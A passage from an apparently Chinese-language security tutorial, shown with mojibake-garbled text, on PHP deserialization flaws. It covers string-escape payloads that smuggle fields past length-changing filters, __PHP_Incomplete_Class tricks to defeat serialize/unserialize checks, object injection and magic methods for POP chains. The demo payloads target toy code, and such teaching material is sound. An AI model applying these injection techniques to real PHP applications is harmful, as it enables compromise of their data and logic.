&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\\&#x27;</span> + <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>(<span class="string">&#x27;\\&#x27;</span>))</span><br></pre></td></tr></table></figure></div><h4 id="åˆ©ç”¨å¼•ç”¨"><a class="markdownIt-Anchor" href="#åˆ©ç”¨å¼•ç”¨">#</a> åˆ©ç”¨â€˜å¼•ç”¨â€™</h4><p>å¯¹äºéœ€è¦åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨å¼•ç”¨æ¥è®©ä¸¤ä¸ªå˜é‡å§‹ç»ˆç›¸ç­‰.</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢è¿™ä¸ªä¾‹å­å°† <code>$b</code>  è®¾ç½®ä¸º <code>$a</code>  çš„å¼•ç”¨ï¼Œå¯ä»¥ä½¿ <code>$a</code>  æ°¸è¿œä¸ <code>$b</code>  ç›¸ç­‰</p><h4 id="phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a class="markdownIt-Anchor" href="#phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸">#</a> php ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h4><h5 id="æƒ…å†µä¸€è¿‡æ»¤åå­—ç¬¦è¿‡å¤š"><a class="markdownIt-Anchor" href="#æƒ…å†µä¸€è¿‡æ»¤åå­—ç¬¦è¿‡å¤š">#</a> æƒ…å†µä¸€ï¼šè¿‡æ»¤åå­—ç¬¦è¿‡å¤š</h5><p>ä¾‹å¦‚ä»¥ä¸‹æƒ…å½¢ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;æ­¤æ—¶ï¼Œage=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure></div><p>æ­£å¸¸æƒ…å†µï¼Œä¼ å…¥ <code>name=mao</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png" alt="image.png"></p><p>å¦‚æœæ­¤æ—¶å¤šä¼ å…¥ä¸€ä¸ª x çš„è¯ä¼šæ€æ ·ï¼Œæ¯«æ— ç–‘é—®ååºåˆ—åŒ–å¤±è´¥ï¼Œç”±äºæº¢å‡º (s æœ¬æ¥æ˜¯ 4 ç»“æœå¤šäº†ä¸€ä¸ªå­—ç¬¦å‡ºæ¥)ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®ç°å­—ç¬¦ä¸²é€ƒé€¸</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/im4EPGFUnTDd52o.png" alt="image.png"></p><p>é‚£æˆ‘ä»¬ä¼ å…¥ <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/Amz5WT7IJGrwKL3.png" alt="image.png"></p><p>ä¼ å…¥ <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> <br> <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  è¿™ä¸€éƒ¨åˆ†ä¸€å…±äºŒåä¸ªå­—ç¬¦<br>ç”±äºä¸€ä¸ª x ä¼šè¢«æ›¿æ¢ä¸ºä¸¤ä¸ªï¼Œæˆ‘ä»¬è¾“å…¥äº†ä¸€å…± 20 ä¸ª xï¼Œç°åœ¨æ˜¯ 40 ä¸ªï¼Œå¤šå‡ºæ¥çš„ 20 ä¸ª x å…¶å®å–ä»£äº†æˆ‘ä»¬çš„è¿™äºŒåä¸ªå­—ç¬¦ <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> ï¼Œä»è€Œé€ æˆ <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  çš„æº¢å‡ºï¼Œè€Œ &quot; é—­åˆäº†å‰ä¸²ï¼Œä½¿å¾—æˆ‘ä»¬çš„å­—ç¬¦ä¸²æˆåŠŸé€ƒé€¸ï¼Œå¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œè¾“å‡º <code>woaini</code> <br> æœ€åçš„ï¼›} é—­åˆååºåˆ—åŒ–å…¨è¿‡ç¨‹å¯¼è‡´åŸæ¥çš„ <code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>  è¢«èˆå¼ƒï¼Œä¸å½±å“ååºåˆ—åŒ–è¿‡ç¨‹</p><h5 id="æƒ…å†µäºŒè¿‡æ»¤åå­—ç¬¦å˜å°‘"><a class="markdownIt-Anchor" href="#æƒ…å†µäºŒè¿‡æ»¤åå­—ç¬¦å˜å°‘">#</a> æƒ…å†µäºŒï¼šè¿‡æ»¤åå­—ç¬¦å˜å°‘</h5><p>ä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;æ­¤æ—¶ï¼Œage=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>æ­£å¸¸æƒ…å†µä¼ å…¥ <code>name=mao&amp;age=11</code>  çš„ç»“æœ</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/S8lKoWxiAdyDfna.png" alt="image.png"></p><p>æ„é€ ä¸€ä¸‹</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/wrXv7GNB41Amlug.png" alt="image.png"></p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å‰é¢å°‘äº†ä¸€åŠï¼Œå¯¼è‡´åé¢çš„å­—ç¬¦è¢«åƒæ‰ï¼Œä»è€Œæ‰§è¡Œäº†æˆ‘ä»¬åé¢çš„ä»£ç ï¼›<br>æˆ‘ä»¬æ¥çœ‹ï¼Œè¿™éƒ¨åˆ†æ˜¯ age åºåˆ—åŒ–åçš„ç»“æœ</p><p>s:3:â€œageâ€;s:28:â€œ11â€;s:3:â€œageâ€;s:6:â€œwoainiâ€;}&quot;</p><p>ç”±äºå‰é¢æ˜¯ 40 ä¸ª x æ‰€ä»¥å¯¼è‡´å°‘äº† 20 ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦åé¢æ¥è¡¥ä¸Šï¼Œ <code>&quot;;s:3:&quot;age&quot;;s:28:&quot;</code> 11 è¿™ä¸€éƒ¨åˆ†åˆšå¥½ 20 ä¸ªï¼Œåé¢ç”±äºæœ‰&quot; é—­åˆäº†å‰é¢å› æ­¤åé¢çš„å‚æ•°å°±å¯ä»¥ç”±æˆ‘ä»¬è‡ªå®šä¹‰æ‰§è¡Œäº†</p><h4 id="åˆ©ç”¨ä¸å®Œæ•´ç±»ç»•è¿‡åºåˆ—åŒ–å›æ—‹é•–"><a class="markdownIt-Anchor" href="#åˆ©ç”¨ä¸å®Œæ•´ç±»ç»•è¿‡åºåˆ—åŒ–å›æ—‹é•–">#</a> åˆ©ç”¨ä¸å®Œæ•´ç±»ç»•è¿‡åºåˆ—åŒ–å›æ—‹é•–</h4><p>å½“å­˜åœ¨  <code>serialize(unserialize($x)) != $x</code>  è¿™ç§å¾ˆç¥å¥‡çš„ä¸œè¥¿æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸å®Œæ•´ç±»  <code>__PHP_Incomplete_Class</code>  æ¥è¿›è¡Œå¤„ç†</p><p>å½“æˆ‘ä»¬å°è¯•ååºåˆ—åŒ–åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„ç±»æ˜¯ï¼ŒPHP ä¼šä½¿ç”¨  <code>__PHP_Incomplete_Class_Name</code>  è¿™ä¸ªè¿½åŠ çš„å­—æ®µæ¥è¿›è¡Œå­˜å‚¨</p><p>æˆ‘ä»¬äºæ˜¯å¯ä»¥å°è¯•è‡ªå·±æ„é€ ä¸€ä¸ªä¸å®Œæ•´ç±»</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:1:&quot;F&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&#x27;O:1:&quot;F&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$raw</span>)) == <span class="variable">$exp</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†</p><p>æ›´è¿‘ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªè®©ä¸€ä¸ªå¯¹è±¡è¢«è°ƒç”¨åå‡­ç©ºæ¶ˆå¤±ï¼Œåªéœ€è¦æ‰‹åŠ¨æ„é€ æ—  <code>__PHP_Incomplete_Class_Name</code>  çš„ä¸å®Œæ•´å¯¹è±¡</p><h5 id="serialize-å‡½æ•°åœ¨å¤„ç†__php_incomplete_classå¯¹è±¡æ—¶æ‰€è¿›è¡Œçš„ç‰¹æ®Šæ“ä½œ"><a class="markdownIt-Anchor" href="#serialize-å‡½æ•°åœ¨å¤„ç†__php_incomplete_classå¯¹è±¡æ—¶æ‰€è¿›è¡Œçš„ç‰¹æ®Šæ“ä½œ">#</a> serialize () å‡½æ•°åœ¨å¤„ç† <code>__PHP_Incomplete_Class</code>  å¯¹è±¡æ—¶æ‰€è¿›è¡Œçš„ç‰¹æ®Šæ“ä½œ</h5><p>unserialize () åœ¨å‘ç°å½“å‰ PHP ä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰åŒ…å«ç›¸å…³ç±»çš„ç±»å®šä¹‰æ—¶å°†åˆ›å»ºä¸€ä¸ª  <code>__PHP_Incomplete_Class</code>  å¯¹è±¡ã€‚è€Œ serialize () åœ¨å‘ç°éœ€è¦è¿›è¡Œåºåˆ—åŒ–çš„å¯¹è±¡æ˜¯  <code>__PHP_Incomplete_Class</code>  åï¼Œå°†å¯¹å…¶è¿›è¡Œ ç‰¹æ®Šå¤„ç† ä»¥å¾—åˆ°æè¿°å®é™…å¯¹è±¡è€Œé  <code>__PHP_Incomplete_Class</code>  å¯¹è±¡çš„åºåˆ—åŒ–æ–‡æœ¬ï¼Œè€Œè¿™é‡Œå°±åŒ…å«äº† å°†å±æ€§çš„æè¿°å€¼å‡ä¸€ è¿™ä¸€æ­¥ã€‚<br>é‚£ä¹ˆå¯¹è±¡æ‰€å±ç±»çš„åç§°æ˜¯å¦ä¼šå‘ç”Ÿæ›¿æ¢ï¼Œåºåˆ—åŒ–æ–‡æœ¬ä¸­çš„  <code>__PHP_Incomplete_Class_Name</code>  æ˜¯å¦ä¼šè¢«è‡ªåŠ¨åˆ é™¤ä»¥ä½¿å¾—åºåˆ—åŒ–æ–‡æœ¬ä¸­çš„å±æ€§ä¸ªæ•°æè¿°å€¼ä¸å®é™…ç›¸ç¬¦å‘¢ï¼Ÿå¯¹æ­¤ï¼Œè¯·å‚è€ƒå¦‚ä¸‹ç¤ºä¾‹ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:3:&#123;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:7:&quot;MyClass&quot;;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;</span>)));</span><br></pre></td></tr></table></figure></div><p>æ‰§è¡Œç»“æœ</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">69</span>) <span class="string">&quot;O:7:&quot;</span>MyClass<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:8:&quot;</span>RedHeart<span class="string">&quot;;s:6:&quot;</span>nation<span class="string">&quot;;s:5:&quot;</span>China<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure></div><p>ç»“åˆå‰é¢è§‚å¯Ÿåˆ°çš„ç§ç§ç°è±¡ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡º serialize () å‡½æ•°å¯¹ __PHP_Incomplete_Class å¯¹è±¡æ‰§è¡Œäº†å¦‚ä¸‹ ç‰¹æ®Šæ“ä½œï¼ˆæ“ä½œæè¿°é¡ºåºå¹¶é serialize å‡½æ•°çš„å®é™…æ“ä½œé¡ºåºï¼‰ï¼š</p><p>å°† <code> __PHP_Incomplete_Class</code>  å¯¹è±¡ä¸­çš„ å±æ€§ä¸ªæ•°å‡ä¸€ å¹¶å°†å…¶ä½œä¸ºåºåˆ—åŒ–æ–‡æœ¬ä¸­ å¯¹å®é™…å¯¹è±¡å±æ€§ä¸ªæ•°çš„æè¿°å€¼ã€‚<br>å°†  <code>__PHP_Incomplete_Class</code>  å¯¹è±¡çš„ <code> __PHP_Incomplete_Class_Name</code>  ä½œä¸ºåºåˆ—åŒ–æ–‡æœ¬ä¸­ å¯¹è±¡æ‰€å±ç±»çš„æè¿°å€¼ã€‚è‹¥æœªä»  <code>__PHP_Incomplete_Class </code> å¯¹è±¡ ä¸­æ£€æŸ¥åˆ°  <code>__PHP_Incomplete_Class_Name</code>  å±æ€§ï¼Œåˆ™è·³è¿‡æ­¤æ­¥ã€‚<br>å°†  <code>__PHP_Incomplete_Class </code> å¯¹è±¡çš„åºåˆ—åŒ–æ–‡æœ¬ä¸­å¯¹  <code>__PHP_Incomplete_Class_Name </code> å±æ€§çš„æè¿°åˆ å»ã€‚è‹¥æ²¡æœ‰å‘ç°ç›¸å…³æè¿°ï¼Œåˆ™è·³è¿‡æ­¤æ­¥ã€‚</p><p>å…³äº <code>__PHP_Incomplete_Class</code>  æ›´è¯¦ç»†çš„ä»‹ç» &lt;<a class="link" href="https://blog.csdn.net/qq_44879989/article/details/133486308">PHP ååºåˆ—åŒ–æ¼æ´ï¼š__PHP_Incomplete_Class ä¸ serialize (unserialize ($x)) !== $x <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p><h4 id="å¯¹è±¡æ³¨å…¥"><a class="markdownIt-Anchor" href="#å¯¹è±¡æ³¨å…¥">#</a> å¯¹è±¡æ³¨å…¥</h4><p>å½“ç”¨æˆ·çš„è¯·æ±‚åœ¨ä¼ ç»™ååºåˆ—åŒ–å‡½æ•° <code>unserialize()</code>  ä¹‹å‰æ²¡æœ‰è¢«æ­£ç¡®çš„è¿‡æ»¤æ—¶å°±ä¼šäº§ç”Ÿæ¼æ´ã€‚å› ä¸º PHP å…è®¸å¯¹è±¡åºåˆ—åŒ–ï¼Œæ”»å‡»è€…å°±å¯ä»¥æäº¤ç‰¹å®šçš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ç»™ä¸€ä¸ªå…·æœ‰è¯¥æ¼æ´çš„ <code>unserialize</code>  å‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´ä¸€ä¸ªåœ¨è¯¥åº”ç”¨èŒƒå›´å†…çš„ä»»æ„ PHP å¯¹è±¡æ³¨å…¥ã€‚</p><p><strong>å¯¹è±¡æ¼æ´</strong>å‡ºç°å¾—æ»¡è¶³ä¸¤ä¸ªå‰æ</p><blockquote><p>1ã€ <code>unserialize</code>  çš„å‚æ•°å¯æ§ã€‚<br>2ã€ ä»£ç é‡Œæœ‰å®šä¹‰ä¸€ä¸ªå«æœ‰é­”æœ¯æ–¹æ³•çš„ç±»ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•é‡Œå‡ºç°ä¸€äº›ä½¿ç”¨ç±»æˆå‘˜å˜é‡ä½œä¸ºå‚æ•°çš„å­˜åœ¨å®‰å…¨é—®é¢˜çš„å‡½æ•°ã€‚</p></blockquote><p>æ¯”å¦‚ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;y4mao&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div><p>åœ¨è„šæœ¬è¿è¡Œç»“æŸåä¾¿ä¼šè°ƒç”¨ <code>_destruct</code>  å‡½æ•°ï¼ŒåŒæ—¶ä¼šè¦†ç›– test å˜é‡è¾“å‡º <code>maomi</code></p><h3 id="pop"><a class="markdownIt-Anchor" href="#pop">#</a> POP</h3><h4 id="é­”æ³•å‡½æ•°"><a class="markdownIt-Anchor" href="#é­”æ³•å‡½æ•°">#</a> â€”â€”â€”â€” é­”æ³•å‡½æ•° â€”â€”â€”</h4><p>æˆ‘éœ€è¦å†æ¬¡æå‡ºé­”æ³•å‡½æ•°å¹¶ä¸”éœ€è¦ç»†è‡´çš„è§£é‡Šä¾›æˆ‘æ›´åŠ æ·±åˆ»çš„ç†è§£</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__sleep() //æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__construct() //æ„é€ å‡½æ•°, åœ¨å¯¹åº”å¯¹è±¡å®ä¾‹åŒ–æ—¶è‡ªåŠ¨è¢«è°ƒç”¨. #å­ç±»ä¸­çš„æ„é€ å‡½æ•°ä¸ä¼šéšå¼è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°.åœ¨ PHP 8 ä»¥å‰, ä¸ç±»ååŒåçš„æ–¹æ³•å¯ä»¥ä½œä¸º __constuct è°ƒç”¨ä½† __construct æ–¹æ³•ä¼˜å…ˆ</span><br><span class="line">__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼ˆå¯¹è±¡ä¸å†è¢«å¼•ç”¨ï¼ˆunsetï¼‰ï¼Œè„šæœ¬æ‰§è¡Œç»“æŸï¼‰ï¼ˆå½“å­˜åœ¨__destructæ—¶ï¼Œå¤´ä¸€èˆ¬æ˜¯ä»–ï¼‰</span><br><span class="line">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®ï¼ˆæ¯”å¦‚è®¿é—®privateå±æ€§æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶ï¼‰æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®ï¼ˆ$this-&gt;str[&#x27;str&#x27;]-&gt;sourceï¼‰éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•</span><br><span class="line">__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ï¼ˆè¾“å‡ºä¸€ä¸ªå¯¹è±¡ã€å±æ€§ï¼Œå°†å¯¹è±¡æˆ–å±æ€§ä¸å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¯¹å¯¹è±¡æˆ–å±æ€§è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼‰</span><br><span class="line">__invoke() //å½“å°è¯•å°†å¯¹è±¡ï¼ˆå±æ€§ï¼‰è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br><span class="line">__debugInfo() //åœ¨ä½¿ç”¨ var_dump, print_r æ—¶ä¼šè¢«è°ƒç”¨</span><br><span class="line">__set_state()   // è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨</span><br><span class="line">__clone()       // å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><span class="line">__autoload()    // å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br></pre></td></tr></table></figure></div><p>ä¼šå‘ç°ï¼Œæˆ‘åœ¨å¾ˆå¤šé­”æ³•å‡½æ•°çš„è§¦å‘æ–¹å¼çš„è§£é‡Šä¸­å¯¹è±¡åé¢éƒ½åŠ äº†ï¼ˆå±æ€§ï¼‰ï¼Œè¿™ä¸ php å®˜æ–¹æ‰‹å†Œå’Œå…¶ä»–åšå®¢æ–‡ç« 